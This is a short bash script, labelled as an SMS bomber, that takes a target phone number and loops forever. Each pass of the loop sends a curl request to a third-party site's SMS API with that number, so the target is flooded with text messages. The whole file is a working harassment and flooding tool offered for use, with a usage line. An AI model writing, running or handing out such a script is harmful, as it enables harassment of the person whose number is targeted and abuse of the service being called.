#!/bin/bash
#Script for SMS Bombing
number=$1
echo Target number is $number
echo 'ctrl+c For Stop'
api(){
for (( ; ; ))
do
   curl https://bomjesussupermercado.com/api.php?number=$number
done
}
api

# usage: bash script.sh 017XXXXXXXX
